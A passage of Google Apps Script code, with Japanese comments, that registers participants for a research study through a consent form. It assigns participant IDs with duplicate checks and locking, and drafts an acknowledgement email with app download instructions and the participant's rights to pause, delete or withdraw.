// ⚠️★★ **G1 の受付メールを流用しない。** G1 は「対面 70 分・1 回きり・課題ページあり」だが、
//   O1 は「実業務・数日〜数週間・課題なし」である。
//   ★ 書くのは 4 点だけ: (a) 参加者 ID (b) アプリの入手 (c) ★ 自動起動の登録
//   (d) ★ いつでも止められる・消せる。
//   ⚠️ **課題ページの話を 1 文字も入れない** (O1 に課題は無い)。

function o1RegisterAckSubject_() {
  return "【GSE 研究】ご登録ありがとうございます（参加者IDとアプリのご案内）";
}

/**
 * 配布 URL が「URL として使えない」か。★ 純関数（⚠️ 値そのものはログにも例外にも出さない）。
 *
 * ⚠️★★ **判定をここ 1 か所に置く理由**（security-checker MEDIUM・2026-08-29）:
 * ★ 書式検査を `o1ConfigProblems_()` にだけ置くと、⚠️ **トリガ設置後に**プロパティを
 * 「フォルダ ID だけ」に書き換えられたとき**誰も止めない** —— 以後の登録者全員に
 * 辿れない「入手先」を書いた受付メールが送られる。
 * → ★ **受付メールを作る当の関数**（`o1RegisterAckBody_`）からも同じ判定を呼ぶ。
 */
function o1AppDownloadUrlIsBad_(url) {
  return String(url || "").indexOf("https://") !== 0;
}

/**
 * 受付メールの本文。★ `appDownloadUrlOpt` を渡すと**その値**を使う。
 *
 * ⚠️★★★ **渡せるようにした理由**（code-reviewer MEDIUM・2026-08-29）:
 * ★ `onO1ConsentSubmit` は「本文を作れるか」を**ダミー ID で先に試して**から採番する。
 * ⚠️ ところが設定を毎回読み直すと、**事前確認と本送信のあいだにプロパティを書き換えられた**
 * とき、★ **P-ID を焼いた後で throw する** —— 「発番済み・通知なし」という、
 * その事前確認が防ぐために置かれた当の状態になる。
 * → ★ 呼び出し側が **1 回読んだ値**を両方へ渡せるようにする（＝同じスナップショットで判断する）。
 */
function o1RegisterAckBody_(pid, appDownloadUrlOpt) {
  var appDownloadUrl =
    appDownloadUrlOpt === undefined ? o1Config_().appDownloadUrl : appDownloadUrlOpt;
  if (!appDownloadUrl) {
    throw new Error(
      "★ スクリプト プロパティ O1_APP_DOWNLOAD_URL が空です。アプリの入手先を書けないので受付メールを作りません（fail-closed）。\n" +
        "⚠️ 空のまま登録させると、被験者は参加者IDだけ受け取ってアプリを入手できません。"
    );
  }
  if (o1AppDownloadUrlIsBad_(appDownloadUrl)) {
    // ⚠️★★ トリガ設置**後**に書き換えられた場合、ここが最後の砦である。
    //   ★ 値そのものは載せない（★ ログ・例外へ配布 URL を出さない）。
    throw new Error(
      "★ スクリプト プロパティ O1_APP_DOWNLOAD_URL が URL ではありません（https:// で始まる形にしてください）。\n" +
        "⚠️ そのまま送ると、被験者は辿れない「入手先」を受け取ります。"
    );
  }
  return [
    "ご登録ありがとうございます。",
    "",
    "▼ あなたの参加者ID",
    "    " + pid,
    "★ アプリの最初の画面でこの記号を入力していただきます。",
    "⚠️ この記号は氏名とは別に保管され、記録には氏名もメールアドレスも入りません。",
    "",
    "▼ アプリの入手",
    "    " + appDownloadUrl,
    "★ ご利用の OS のファイル（O1_実施用_Windows.zip / O1_実施用_macOS.zip）を",
    "  ダウンロードし、**展開したフォルダをそのまま**デスクトップなどに置いてください。",
    "⚠️ フォルダの中のファイルは 1 つも消したり動かしたりしないでください。",
    "  同じフォルダにある目印のファイルを見て、アプリが動作を決めています。",
    "",
    "★ 同梱の「README_先に読む.txt」に、最初の 1 回だけ必要な手順が書いてあります。",
    "⚠️ macOS の方は、最初の起動だけ研究者と一緒に行います（5 分ほど）。日程をご相談ください。",
    "",
    "▼ ★ 毎日の起動について（大切です）",
    "★ この研究は「ふだんの作業のあいだ、ずっと動いている」ことで成り立ちます。",
    "  アプリが起動していない日は、記録がまるごと空になります。",
    "★ README に、パソコンを起動したときに**自動で立ち上がるようにする手順**を書いています。",
    "  ⚠️ 難しければ、そのままにして構いません。研究者が一緒に設定します。",
    "",
    "▼ ★★★ いつでもできること",
    "1. 記録中は画面に印が出ます。★ 印が出ていないときは記録していません。",
    "2. ワンクリックで一時停止できます。★ 理由をお聞きすることはありません。",
    "3. あとから「昨日の 14:00〜15:00 を消して」のように時間帯を指定して削除できます。",
    "   ★ 記録が研究者へ送られるのは 1 日ぶんをまとめてから 48 時間後です。",
    "   ⚠️ それより前なら、あなたの端末の上で消えます。",
    "   ⚠️ 送られたあとの削除は、下の連絡先へお申し出ください（研究者側で削除し、記録に残します）。",
    "",
    "▼ 送信だけを止めたいとき",
    "★ 記録は取りつつ、研究者への自動送信だけを止めることもできます。",
    "  下の連絡先へお申し出ください（⚠️ 理由はお聞きしません）。",
    "",
    "▼ 参加をやめたくなったら",
    "★ いつでもやめられます。不利益は一切ありません。",
    "  やめた時点で、それまでの記録をすべて削除するようお求めいただけます。",
    "",
    "▼ お問い合わせ",
    "  " + O1_CONTACT_NAME + "（" + O1_AFFILIATION + "）",
    "  " + O1_CONTACT_EMAIL,
    "",
    "どうぞよろしくお願いいたします。",
  ].join("\n");
}

/**
 * ★ 受付メールの文面を Logger に出すだけ (⚠️ **送信しない**)。
 * ★ 配備手順 6。メール送信は取り消せないので、文面は必ず先に目で見る。
 */
function previewO1RegisterAckEmail() {
  var body;
  try {
    body = o1RegisterAckBody_("P999");
  } catch (e) {
    Logger.log("❌ 文面を作れません: " + e);
    return "";
  }
  Logger.log("件名: " + o1RegisterAckSubject_());
  Logger.log("--------");
  Logger.log(body);
  Logger.log("--------");
  Logger.log("⚠️ ★ これは preview です。送信していません。");
  return body;
}

// ============================================================
// 提出トリガ (★ O1-C がそのまま参加登録である)
// ============================================================

function installO1ConsentTrigger() {
  // ⚠️★★★ **設定が欠けたままトリガを張らない** (code-reviewer 指摘・2026-08-28)。
  //   ★ 以前はここだけ「問題をログに出して、それでも張る」だった。
  //   ⚠️ 例えば `O1_APP_DOWNLOAD_URL` が空のまま張ると、被験者が登録するたびに
  //     「受付メールを作れない」経路へ入る。★ `setupO1Forms` は同じ関数で止まるのに、
  //     ここだけ開いていた（＝ **一番危ない入口が一番緩い**）。
  //   ★ 順序も大事: **`removeO1ConsentTriggers()` より前に**判定する
  //     （⚠️ 先に消すと、失敗したときに既存のトリガまで失う）。
  var problems = o1ConfigProblems_();
  if (problems.length) {
    throw new Error(
      "⛔ 設定に問題があるのでトリガを張りません（fail-closed）:\n  - " +
        problems.join("\n  - ") +
        "\n\n★ `checkO1FormConfig()` で同じ内容を読み取り専用で確認できます。\n" +
        "⚠️ 既存のトリガは**消していません**。"
    );
  }
  removeO1ConsentTriggers();
  var consentFormId = o1Config_().consentFormId;
  o1AssertNotG1Form_(consentFormId, "FORM_ID_O1_CONSENT");
  o1AssertNotS1Form_(consentFormId, "FORM_ID_O1_CONSENT");
  ScriptApp.newTrigger("onO1ConsentSubmit")
    .forForm(FormApp.openById(consentFormId))
    .onFormSubmit()
    .create();
  Logger.log("✅ onO1ConsentSubmit トリガを O1-C に設定しました");
  Logger.log("ℹ️ O1_AUTO_SEND=" + O1_AUTO_SEND + "（false=ログに出すだけ / true=自動送信）");
  if (!O1_AUTO_SEND) {
    Logger.log(
      "⚠️ ★ O1_AUTO_SEND=false のままだと、登録されても**被験者には何も届きません**（ログに出るだけ）。"
    );
  }
}

function removeO1ConsentTriggers() {
  var triggers = ScriptApp.getProjectTriggers();
  var n = 0;
  for (var i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === "onO1ConsentSubmit") {
      ScriptApp.deleteTrigger(triggers[i]);
      n++;
    }
  }
  if (n) Logger.log("🧹 既存の onO1ConsentSubmit トリガを " + n + " 件削除しました");
}

/**
 * O1-C の回答を取り出す。
 * ⚠️★★★ 設問タイトルは `Q_O1_*` 定数と**共有する**。片方だけ変えると、
 *   提出されても氏名やメールが取れず、★ **黙って発番が止まる**。
 */
function o1ConsentAnswers_(response) {
  var out = { name: "", email: "", pid: "", os: "" };
  var items = response.getItemResponses();
  for (var i = 0; i < items.length; i++) {
    var title = items[i].getItem().getTitle();
    var v = items[i].getResponse();
    var s = Array.isArray(v) ? v.join(" / ") : String(v == null ? "" : v);
    if (title === Q_O1_NAME) out.name = s.trim();
    else if (title === Q_O1_EMAIL) out.email = s.trim();
    else if (title === Q_O1_PID) out.pid = s.trim().toUpperCase();
    else if (title === Q_O1_OS) out.os = s.trim();
  }
  return out;
}

/**
 * ⚠️★★★ conflict の**理由ごと**に、研究者がやるべきことを書く。
 *
 * ★ 旧実装は理由が複数あるのに「別のメールアドレスが登録されています」の 1 文だけを出していた。
 *   ⚠️ 研究者はその文を読んで**メールを直そうとする**が、`bare-row-claim` の正しい対処は
 *   「氏名を入れる（か、その行を消す）」であり、`dup-email-in-roster` の正しい対処は
 *   「重複した行のどちらかを消す」である。→ ★ **間違った文言は間違った修復を招く。**
 */
function o1ConflictMessage_(found, a) {
  var where = found.rows ? "行 " + found.rows.join(" / ") : "ロスター " + found.row + " 行目";
  var head = "⛔⚠️★★★ 登録を止めました（★ 発番も受付メールも行っていません）。\n";
  var who = "   提出者: " + o1MaskEmail_(a.email) + "\n";
  switch (found.reason) {
    case "dup-email-in-roster":
      return (
        head +
        "   ★ **同じメールアドレスがロスターに " + found.rows.length + " 行あります**（" + where + "）。\n" +
        who +
        "   ⚠️ どちらの P-ID を配るべきか機械には決められません（★ 先頭行を黙って採ると、\n" +
        "      行が並び替わっただけで**別の ID が出ます** = 1 人に 2 つの識別子）。\n" +
        "   ★ 研究者が**残す行を 1 つに決めて**から、被験者に再提出してもらってください。\n" +
        "   ⚠️ 自動では直しません（★ P-ID の重複と同じ扱いです）。"
      );
    case "bare-row-claim":
      return (
        head +
        "   ★ 申告された参加者ID（" + found.pid + "・" + where + "）の行は\n" +
        "   **氏名もメールも空**です（⚠️ 誰でも名乗れてしまう「裸の行」）。\n" +
        who +
        "   ★ 研究者が本人確認のうえ、その行に**氏名を入れて**から再提出してもらってください。"
      );
    case "invalid-pid-in-roster":
      return (
        head +
        "   ★ " + where + " の A 列が **P-ID の形をしていません**（「" +
        String(found.pid).slice(0, 20) + "」）。\n" +
        who +
        "   ⚠️ この値で受付メールを送ると、被験者は**存在しない ID**を信じて入力します。\n" +
        "   ★ 採番の途中で中断した `" + O1_PID_RESERVE_PREFIX + "…` の行かもしれません。\n" +
        "   ★ 研究者が A 列に正しい P-ID を入れてから、再提出してもらってください。"
      );
    default: // "email-mismatch" ほか
      return (
        head +
        "   ★ 申告された参加者ID（" + found.pid + "・" + where + "）には\n" +
        "   **別のメールアドレスが登録されています**。\n" +
        who +
        "   ★ 打ち間違いか、他人の ID の申告かを研究者が確認してください。\n" +
        "   ⚠️ 自動で新規発番はしません（★ 同じ人に 2 つの ID を作らないため）。"
      );
  }
}

/**
 * ★★ O1-C の提出で走る。P-ID 採番 → 受付メール。
 *
 * ⚠️ ★ 冪等である: 同じメール (または記入された P-ID) が既にロスターにあれば**再発番しない**。
 *   ★ 1 人の人間に 2 つの識別子を作らない。
 */
function onO1ConsentSubmit(e) {
  o1HandleConsentSubmit_(e, o1RegProfile_());
}

/**
 * 登録の型。O1 と段 1（判断 18・`.steering/20261114-gse-stage1-n3-consent/decisions.md`）で違うところだけを持つ。
 * 採番・重複の検査・登録ログの流れは共有する。
 */
function o1RegProfile_() {
  return {
    label: "O1-C",
    handler: "onO1ConsentSubmit",
    kind: "register",
    checkFn: "checkO1FormConfig()",
    appUrl: function () {
      return o1Config_().appDownloadUrl;
    },
    ackSubject: o1RegisterAckSubject_,
    ackBody: o1RegisterAckBody_,
  };
}

/** 同意フォームの提出の本体。`prof` は `o1RegProfile_()` か `s1RegProfile_()`。 */
function o1HandleConsentSubmit_(e, prof) {
  if (!e || !e.response) {
    Logger.log("❌ " + prof.handler + ": response が取得できません（トリガ経由で呼んでください）");
    return;
  }
  var a = o1ConsentAnswers_(e.response);
  if (!a.email) {
    Logger.log("⛔ " + prof.label + " 提出: メールアドレスが空のため発番しません");
    o1LogMgmt_(prof.kind, "", "blocked", "no-email", "");
    return;
  }

  // ⚠️★★ **申告された P-ID の形式を検証する**（Codex 指摘・2026-08-28）。
  //   ★ `Q_O1_PID` は自由記入なので `P15` `p-015` `015` のような打ち間違いが入る。
  //   ⚠️ 旧実装はロスターに一致しないだけで**黙って「新規参加者」として扱い**、
  //     ★ メールが未登録の既存参加者に **2 つ目の P-ID を発番**しうる。
  //   → ★ 形式が違うなら**何もせず止める**（⚠️ 勝手に解釈して直さない）。
  if (a.pid && !o1IsValidPid_(a.pid)) {
    Logger.log(
      // ⚠️★★ **申告値そのものを実行ログにも出さない**（security-checker MEDIUM・2026-09-03）。
      //   ★ 5 行下のシート書き込みは「自由記入だから書かない」としているのに、
      //     ⚠️ ここで**同じ値を実行ログへ出していた**（★ 実行ログは削除台帳 A-10 の対象である）。
      //   ⚠️ かつ「フォーム側の検証があるから安全」とは言えない ——
      //     ★ `setValidation` は `buildO1ConsentForm` にしか無く、
      //       `migrateO1ConsentForm` は**貼り直さない**（＝ 配備済みフォームで効いている保証が無い）。
      "⛔⚠️ 申告された参加者IDの形式が違います（★ 期待する形は P と数字。長さ " +
        String(a.pid).length + " 文字）。\n" +
        "   ★ 値そのものは出しません（⚠️ 自由記入欄なので何が入るか分かりません）。\n" +
        "   ★ 発番も受付メールも行いませんでした（⚠️ 黙って新規発番しない）。\n" +
        "   ★ 研究者が本人に確認し、正しい ID で再提出してもらってください。\n" +
        "   提出者: " + o1MaskEmail_(a.email)
    );
    // ⚠️ 申告値そのもの（`a.pid`）は**書かない** —— ★ 自由記入欄なので何が入るか分からない。
    o1LogMgmt_(prof.kind, "", "blocked", "bad-pid-format", "OS: " + a.os);
    return;
  }

  // ⚠️★★★ **本文を作れない設定なら、P-ID を焼く前に止める** (code-reviewer 指摘・2026-08-28)。
  //   ★ 以前は採番してから本文作成に失敗していた。⚠️ すると「発番済み・通知なし」が
  //     **設定ミスだけで量産される**（★ ロスターは埋まるのに被験者は何も受け取らない）。
  //   ★ ダミー ID で「作れるか」だけを確かめる（⚠️ 送信はしない）。
  // ★ 設定は **ここで 1 回だけ**読む（⚠️ 下の本送信にも同じ値を渡す）。
  var ackUrlSnapshot = prof.appUrl();
  try {
    prof.ackBody("P000", ackUrlSnapshot);
  } catch (cfgErr) {
    Logger.log(
      "⛔ 受付メールを作れない設定なので**発番しません**（★ P-ID を焼かない）: " + cfgErr + "\n" +
        "   ★ " + prof.checkFn + " を実行して直したあと、被験者に**もう一度提出**してもらってください。"
    );
    o1LogMgmt_(prof.kind, "", "blocked", "config-error", "OS: " + a.os);
    return;
  }

  // ★ 登録ログに残す理由を、ロックの中から外へ持ち出すための入れ物。
  //   ⚠️ ログの追記は**ロックの外**で行う（★ ロックを握ったまま別の表を触らない）。
  //   ⚠️★ 既定は **`lock-failed`** にする。★ `o1WithRosterLock_` はロックを取れないと
  //     **クロージャを 1 度も呼ばずに** null を返すので、⚠️ 既定を `roster-unavailable` に
  //     すると「ロスターが開けなかった」と**嘘の理由**が記録される（★ 原因が違う）。
  var outcome = { reason: "lock-failed", note: "" };

  // ⚠️★★★ **例外でも必ず 1 行残す**（code-reviewer HIGH・2026-09-03）。
  //   ★ 旧実装はこの呼び出しを裸で書いていた。⚠️ `flush()` / `getValues()` が落ちると
  //     例外が `o1WithRosterLock_`（`finally` は解放だけ）を貫通してハンドラごと死に、
  //     ★ **「P-ID は焼けたのに、実行ログにも登録ログにも 1 行も残らない」**状態になった
  //     （★ レビュアーが stub で再現・実測）。
  //   ⚠️ **最も説明の要る失敗だけが記録されない**のは、本機能の目的そのものに反する。
  var pid = null;
  try {
    pid = o1RegisterUnderLock_(a, outcome);
  } catch (unexpected) {
    Logger.log(
      "❌⚠️★★★ 登録処理が予期せず失敗しました: " + unexpected + "\n" +
        "   ⚠️ **P-ID が焼けているかどうかは分かりません。** ★ ロスターを目で確かめてください\n" +
        "      （★ `" + O1_PID_RESERVE_PREFIX + "…` の行が残っていればそれが今回の行です）。\n" +
        "   提出者: " + o1MaskEmail_(a.email)
    );
    // ★ 結果は "error"（⚠️ ok でも blocked でもない ——「分からない」を正直に書く）。
    o1LogMgmt_(prof.kind, "", "error", "unexpected-exception", "OS: " + a.os);
    return;
  }

  if (!pid) {
    Logger.log("❌ 発番できませんでした（★ 回答は失われていません）。上のログの理由を見てください。");
    o1LogMgmt_(prof.kind, "", "blocked", outcome.reason, outcome.note);
    return;
  }
  o1FinishO1Registration_(a, pid, ackUrlSnapshot, outcome, prof);
}

/**
 * ★ ロスターを触る部分（⚠️ ロックの中）。`onO1ConsentSubmit` から切り出した。
 * @return {?string} 確定した P-ID（⚠️ 発番できなければ null。理由は `outcome.reason`）
 */
function o1RegisterUnderLock_(a, outcome) {
  // ★ 同時提出で同じ P-ID が 2 人に出るのを防ぐ（★ 手動採番と同じロックを使う）。
  return o1WithRosterLock_(function () {
    outcome.reason = "roster-unavailable"; // ★ ここまで来た＝ロックは取れている
    var roster = o1OpenRoster_();
    if (!roster) return null;

    var found = o1FindInPhase1Roster_(roster, { pid: a.pid, email: a.email });

    // ⚠️★★★ **他人の P-ID を名乗っている / ロスターの側が壊れている。**
    //   ★ 発番も送信もせず、研究者に判断させる。
    //   ★ 自動で「別人だから新規発番」もしない —— 打ち間違いなら本人に既存 ID を使わせるべきで、
    //     ⚠️ 黙って 2 つ目の ID を作ると、同じ人が 2 人になる（削除要求が追えなくなる）。
    if (found && found.conflict) {
      outcome.reason = found.reason || "roster-conflict";
      outcome.note = "行 " + (found.rows ? found.rows.join("/") : found.row);
      // ⚠️★★ 2026-09-03: **文面を理由別にした。**
      //   ★ 旧実装は理由が 3 つ（★ 現在は 4 つ）あるのに「**別のメールアドレスが
      //     登録されています**」の 1 文だけを出していた。⚠️ `bare-row-claim` と
      //     `invalid-pid-in-roster` と `dup-email-in-roster` では**それは嘘**であり、
      //     ★ 研究者は「メールを直せばよい」と読んで**間違った直し方をする**。
      Logger.log(o1ConflictMessage_(found, a));
      return null;
    }

    if (found) {
      // ⚠️★★★ **A 列（P-ID）が空の行**に当たることがある（★ 氏名とメールだけ先に入れた行）。
      //   ★ その場合は **appendRow へ落とさず、その行に採番して埋める**。
      //   ⚠️ 落とすと同じメールに 2 行目ができ、**1 人に 2 つの識別子**ができる
      //     （★ 本ファイルが冒頭で禁じている状態。code-reviewer が実測して発見・2026-08-28）。
      var p = found.pid;
      if (!p) {
        // ⚠️★★★ 2026-09-03: **この経路も読み返しを通す**（code-reviewer MEDIUM）。
        //   ★ 旧実装は `o1NextParticipantId_` → `setValue` の 1 手で、⚠️ #5 が塞いだはずの
        //     **跨プロジェクト二重採番がここだけ残っていた**。
        //   ★ 空の行に**まず予約トークンを書いて**から確定させると、
        //     ⚠️ 新規採番とまったく同じ経路（譲り合い・表記ゆれ検出）に乗る。
        // ⚠️★★★ **この経路も例外を捕まえる**（cross-review HIGH・2026-09-03）。
        //   ★ `o1AllocatePidRow_`（新規行）には専用の catch があったが、⚠️ **こちらには無かった**。
        //   ⚠️ 途中で落ちると A 列は `candidate`（★ 見た目は有効な P-ID）のまま残り、
        //     ★ `checkO1RosterShape()` の「⏳ の残置行」検出に**引っかからない**
        //     （＝ 誰も気づけない中途半端な行になる）。
        //   → ★ 落ちたら **トークンへ書き戻して**から `settle-exception` を返す。
        var blankToken = o1ReserveToken_();
        var settled;
        try {
          roster.getRange(found.row, 1).setValue(blankToken);
          SpreadsheetApp.flush();
          settled = o1SettlePidForToken_(roster, blankToken);
        } catch (blankErr) {
          Logger.log(
            "❌⚠️★★★ 空 P-ID 行の採番で失敗しました（★ 受付メールは送っていません）: " + blankErr
          );
          try {
            // ★ `⏳` に戻す（⚠️ 中途半端な P-ID を「実在する ID」として残さない）。
            roster.getRange(found.row, 1).setValue(blankToken);
            SpreadsheetApp.flush();
            Logger.log("   ★ 行 " + found.row + " を " + blankToken + " に戻しました。");
          } catch (rollbackErr) {
            Logger.log(
              "   ⚠️★★ **書き戻しにも失敗しました**: " + rollbackErr + "\n" +
                "   ★ 行 " + found.row + " の A 列を目で確かめてください。"
            );
          }
          settled = { pid: null, reason: "settle-exception", token: blankToken };
        }
        if (!settled || !settled.pid) {
          outcome.reason = (settled && settled.reason) || "reserve-failed";
          outcome.note = "行 " + found.row + " / OS: " + a.os;
          return null;
        }
        p = settled.pid;
        Logger.log("✅ 既存行（P-ID が空）に採番して埋めました: " + p + " 行 " + settled.row);
        outcome.reason = "filled-blank-pid";
        found.row = settled.row; // ★ 以降のメール/OS 補充は**確定した行**へ書く
      } else {
        Logger.log("♻️ 既存の参加者として扱います: " + p + "（" + o1MaskEmail_(a.email) + "）");
        outcome.reason = "existing-pid";
      }
      outcome.note = "行 " + found.row + " / OS: " + a.os;
      if (!String(roster.getRange(found.row, 3).getValue()).trim()) {
        roster.getRange(found.row, 3).setValue(o1PlainText_(a.email));
      }
      // ★ OS も同じ規則で補う (起票 T-22)。⚠️ **空のときだけ**書く
      //   （★ メール補充と同型。⚠️ 上書きすると研究者が手で直した値を機械が黙って戻す）。
      if (a.os && !String(roster.getRange(found.row, 4).getValue()).trim()) {
        roster.getRange(found.row, 4).setValue(o1PlainText_(a.os));
      }
      SpreadsheetApp.flush(); // ★ ロック解放前に確定させる
      return p;
    }

    // ⚠️★★★ 2026-09-03: **予約トークン方式に置き換えた** (起票 T-27)。
    //   ★ 旧実装は `o1NextParticipantId_` → `appendRow([newPid, ...])` の 1 手で、
    //     ⚠️ 別プロジェクト（G1 / Phase1）と同時に走ると**同じ番号を 2 人に配りうる**。
    //   ★ 新実装は「予約 → 採番 → 読み返し → 重複していたら譲ってやり直す」。
    //   ★ D 列 = OS (起票 T-22)。⚠️ ロスターの列順は Phase1 の `ROSTER_HEADER` で固定
    //     （逐語:「列順に依存するため変更不可」）なので、位置で書いてよい。
    var got = o1AllocatePidRow_(roster, [
      o1PlainText_(a.name),
      o1PlainText_(a.email),
      o1PlainText_(a.os || ""),
    ]);
    if (!got || !got.pid) {
      // ⚠️★ 理由を**混ぜない**（code-reviewer MEDIUM）。★ 研究者の対処が違う:
      //   `reserve-row-lost`（予約行が消えた）/ `roster-pid-format-drift`（表記ゆれ）/
      //   `settle-exception`（一過性の障害）/ `reserve-failed`（3 回とも衝突）。
      outcome.reason = (got && got.reason) || "reserve-failed";
      outcome.note = "OS: " + a.os;
      return null;
    }
    outcome.reason = "new-pid";
    outcome.note = "行 " + got.row + " / OS: " + a.os;
    Logger.log("✅ P-ID 発番: " + got.pid + "（" + o1MaskEmail_(a.email) + "）");
    return got.pid;
  });
}

/**
 * ★ 採番の**あと**（⚠️ ロックの外）: 重複の最終検査 → 受付メール → 登録ログ。
 */
function o1FinishO1Registration_(a, pid, ackUrlSnapshot, outcome, prof) {
  // 型を渡し忘れたら O1 に倒さず止める（段 1 の登録に O1 の件名と URL を送らない）。
  if (!prof || !prof.kind) throw new Error("o1FinishO1Registration_: 登録の型（prof）がありません");
  // ============================================================
  // ⚠️★★★ 採番の排他は**プロジェクトを跨がない** (起票 T-24)
  // ============================================================
  // ★ `LockService.getScriptLock()` は**スクリプト プロジェクト単位**である。
  //   ⚠️ G1 (`GSE_G1_Form_Builder.gs`) と Phase1 は**別プロジェクト = 別のロック**なので、
  //     ★ G1-C と O1-C がほぼ同時に提出されると **両方が同じ「最大値 + 1」を読む**。
  //   ⚠️ 別プロジェクトにすること自体は 2026-08-07 の事故対策で**必須**なので、構成は変えられない。
  //   → ★ **書いたあとに読み返して、重複していたら受付メールを送らない**。
  //
  // ⚠️★★★ **これは「重複を防ぐ」仕組みではない。窓を狭めるだけである**
  //   （cross-review の Codex 指摘・2026-08-29）:
  //     ★ 読み返した**あと**に他プロジェクトが同じ P-ID を append する順序は防げない
  //       （＝ TOCTOU）。⚠️ その場合、**こちらは送ってしまう**。
  //     ⚠️ ★ **2026-09-01 に訂正した。** 旧文は「さらに **G1 側には同等の検査が無い**
  //       （★ G1 実施中で触れないため）。→ G1 が先に送れば、こちら側で止めても被験者には
  //       重複 ID が渡る」と書いていたが、⚠️ **G1 にも同じ検査を入れた**
  //       （`Form_G1/GSE_G1_Form_Builder.gs` の `g1CountPidRows_` と重複時の中止）。
  //       → ★ **両側が止めるようになった。** ⚠️ ただし TOCTOU は両側に残るので、
  //         「防げる」ようになったわけではない（★ 窓が狭くなっただけ）。
  //   ★ 正しく防ぐには**採番を 1 か所に集約する**しかない（⚠️ G1 を触るので今はできない）。
  //   → ★ したがって本検査の役割は「**気づけない状態を無くす**」ことである。
  //
  // ⚠️★★ **2026-09-03 追記（起票 T-27）**: 新規採番は `o1AllocatePidRow_`（予約トークン方式）
  //   に置き換えたので、★ 衝突しても**その場で譲って採番し直す**ようになった。
  //   ⚠️ それでもこの検査は**残す**。★ 理由は 2 つ:
  //     1. ★ 既存参加者の経路（`existing-pid` / `filled-blank-pid`）は採番しないので
  //        `o1AllocatePidRow_` を通らない —— ⚠️ ロスターが既に重複していれば見逃す。
  //     2. ⚠️ TOCTOU は消えていない（★ `o1AllocatePidRow_` の最後の読み返しの**後**に
  //        他プロジェクトが append する順序は防げない）。→ ★ ここが最後の網である。
  //   ⚠️ 重複した P-ID を被験者に渡すと**回収できない**（★ その ID で `.age` /
  //     `metrics/<PID>/` が作られ、2 人ぶんが 1 つの P-ID に混ざる → 削除要求が履行不能）。
  var dupRows = o1RosterRowsForPid_(pid);
  if (dupRows === null) {
    // ★ 検査そのものが失敗した場合は**送る**。⚠️ 読み取りの失敗で被験者を止めない
    //   （★ 直前に書き込めているので、ここで開けないのは一過性の可能性が高い）。
    Logger.log("⚠️ ★ P-ID の重複検査ができませんでした（★ 受付メールは送ります）: " + pid);
  } else if (dupRows.length > 1) {
    // ⚠️★★★ **原因を 2 つに分ける**（code-reviewer HIGH の後段・2026-09-03）。
    //   ★ 「本当に同じ生値が 2 行」（＝ 跨プロジェクトの同時採番）と、
    //     ⚠️ 「見た目は同じだが生値が違う」（＝ `p007` / `" P007"` などの**表記ゆれ**）は
    //     **研究者の直し方がまったく違う**。
    //   ⚠️ 旧実装は前者の文面だけを出していたので、★ 後者のとき研究者は
    //     「同時採番だ」と読んで**存在しない競合を探しに行く**。
    var labels = o1RowLabels_(dupRows);
    var drifted = [];
    for (var d = 0; d < dupRows.length; d++) {
      if (dupRows[d].raw !== pid) drifted.push(dupRows[d].row);
    }
    if (drifted.length) {
      Logger.log(
        "⛔⚠️★★★ **同じ P-ID に見える行が " + dupRows.length + " 行あります**: " + pid +
          "（行 " + labels.join(" / ") + "）\n" +
          "   ⚠️ これは**同時採番ではありません**。★ 行 " + drifted.join(" / ") +
          " の A 列が\n" +
          "      **見た目は同じでも書き方が違います**（例: 小文字 / 前後の空白 / 全角）。\n" +
          "   ⚠️ 採番の規則は `^P\\d+$` なので、そういう行は**採番には見えず、照合には見えます**。\n" +
          "   ★ その行の A 列を `" + pid + "` の形に直してください（⚠️ 直すまで登録は止まります）。\n" +
          "   ★ 受付メールは**送っていません**（⚠️ 同じ ID を 2 人に配ると回収できません）。\n" +
          "   提出者: " + o1MaskEmail_(a.email) + "（OS: " + a.os + "）"
      );
      o1LogMgmt_(
        prof.kind, pid, "blocked", "roster-pid-format-drift",
        "行 " + labels.join("/") + " / OS: " + a.os
      );
      return;
    }
    Logger.log(
      "⛔⚠️★★★ **同じ P-ID が " + dupRows.length + " 行あります**: " + pid +
        "（行 " + labels.join(" / ") + "）\n" +
        "   ★ 受付メールは**送っていません**（⚠️ 重複した ID を配ると回収できません）。\n" +
        "   ⚠️ 別プロジェクト（G1 / Phase1）と**同時に採番された**可能性があります ——\n" +
        "      ★ LockService はスクリプト プロジェクト単位で、跨いだ排他は効きません。\n" +
        "   ★ どちらの行を残すかは**研究者が決めてください**（⚠️ 自動では直しません）。\n" +
        "   ★ 直したあと、提出者にもう一度提出してもらえば同じ経路で受付メールが送られます。\n" +
        "   提出者: " + o1MaskEmail_(a.email) + "（OS: " + a.os + "）"
    );
    o1LogMgmt_(prof.kind, pid, "blocked", "dup-pid", "行 " + labels.join("/") + " / OS: " + a.os);
    return;
  }

  // ⚠️★ ここで例外が出ると「発番済みだが通知が無い」状態になる。
  //   ★ ログに **P-ID と OS を必ず残す**（研究者が手で送れるようにする）。
  //
  // ⚠️★★ 2026-09-03: **`o1LogMgmt_` を try の外へ出した**（code-reviewer MEDIUM）。
  //   ★ 内側に置くと、⚠️ 将来 `o1LogMgmt_` が投げた瞬間に
  //     **送信済みなのに `mail-failed` と記録され、行が 2 本出る**
  //     （= fail-open が崩れる唯一の構造的経路）。→ ★ 中では**旗を立てるだけ**にする。
  var logResult = "";
  var logReason = "";
  try {
    var subject = prof.ackSubject();
    var body = prof.ackBody(pid, ackUrlSnapshot);
    if (O1_AUTO_SEND) {
      MailApp.sendEmail(a.email, subject, body);
      Logger.log("📧 受付メールを送信しました → " + o1MaskEmail_(a.email) + "（OS: " + a.os + "）");
      logResult = "ok";
      logReason = outcome.reason;
    } else {
      // ⚠️★ 下書きは作らない（★ 上の `GmailApp` を使わない理由を参照）。
      Logger.log("📝 O1_AUTO_SEND=false のため**送信していません** → " + o1MaskEmail_(a.email));
      Logger.log("   ⚠️ ★ 被験者には届いていません。下の文面を研究者が手で送ってください:");
      Logger.log("   件名: " + subject);
      Logger.log(body);
      // ⚠️★★ **"ok" にしない。** ★ P-ID は焼けたが**被験者には届いていない**。
      //   ⚠️ ここを ok と書くと、後からログを読んだ研究者が「届いた」と読む。
      // ★ 理由は**連結する**（code-reviewer LOW）—— ⚠️ 上書きすると
      //   `new-pid` と `existing-pid` の区別がログから消える。
      logResult = "partial";
      logReason = "autosend-off/" + outcome.reason;
    }
  } catch (mailErr) {
    // ⚠️★ 2026-08-28 の訂正: 以前ここに「再提出しても冪等スキップされるので**永久に届かない**」
    //   と書いていたが、**事実と違う**（code-reviewer が実測）。★ 再提出すると既存経路を通り、
